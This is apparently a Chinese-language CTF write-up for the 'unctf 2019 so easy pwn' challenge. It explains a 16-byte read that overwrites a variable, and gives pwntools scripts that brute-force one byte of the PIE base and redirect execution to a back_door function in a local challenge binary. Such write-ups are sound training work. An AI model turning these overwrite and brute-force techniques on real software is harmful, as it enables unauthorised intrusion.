---
layout:     post
title:      "unctf 2019 so easy pwn"
#subtitle:   " \"Hello World, Hello my first Blog\""
date:       2019-11-26 21:00:00
author:     "Red"
#header-img: "img/post-bg-2015.jpg"
catalog: true
tags:
    - pwn
    - ctf
---

这个题经过 [@x](https://ma2in9.top) 的注释之后是这样的：
![](https://github.com/zhe6652/zhe6652.github.io/raw/master/_posts/unctf-2019-so-easy-pwn/main.png)

### 寻找漏洞点
思路是在两个read函数处下断点，这种写的操作最容易有漏洞，看到read了16个字节，所以拿16个A测试，关闭地址随机化之后，调试，用vmmap看加载的基地址，得到read的真实地址，初步代码如下：
```python
from pwn import *

context.log_level='DEBUG'
context.terminal=['tmux','split','-h']
sh = process('./pwn')

gdb.attach(sh,'''
	b* 0x5655595a #read1
	b* 0x56555a06 #read2
''')

sh.send("A" * 16)
sh.interactive()
```
调试之后发现welcome中的s地址为``0xffffd16c``, call函数中的v1的地址为``0xffffd178``,buf地址为``0xffffd17c``,也就是说s和v1地址只差了12，我们输入16个字节后刚好可以覆盖v1的地址，这就是漏洞所在：
![](https://github.com/zhe6652/zhe6652.github.io/raw/master/_posts/unctf-2019-so-easy-pwn/vul.png)

### 利用
查看call函数中函数恰巧return了v1，而v1又能被我们覆盖，所以利用方法不言而喻，用12个padding加上一个返回地址即可，查看程序中有back_door可以利用，但是程序开启了PIE。再看welcome函数中泄露了基地址的前16位，也就是前4个字节，back_door中
泄露了后三字节，也就是说需要我们爆破中间的一个字节：
```python
from pwn import *
context.log_level='DEBUG'	
context.terminal=['tmux','split','-h']
try:
	for i in range(0x1000, 0x10000, 0x1000):
		print hex(i)
		sh = process('./pwn')
		  
		back_door = 0x000009cd
		offset = 12 

		#gdb.attach(sh,'''
		#	b* 0x5655595a
		#	b* 0x56555a06
		#''')
		sh.recvuntil("the ")
		ads = (int(sh.recvuntil(" ", drop = True)[-6:]) << 16) +i
		print ads
		sh.recvuntil("name?")
		payload = "a"*offset +p32(back_door +ads)
		sh.send(payload)
		sh.recvuntil(":")
		sh.send("anything")
		sh.interactive()
except Exception as e:
	pass
```

这个题中有个好玩的地方就是第二次read，不管输入什么都会报错，调试得知原来read函数根本没read成功,read返回值(rax)为-1:
![](https://github.com/zhe6652/zhe6652.github.io/raw/master/_posts/unctf-2019-so-easy-pwn/read.png)
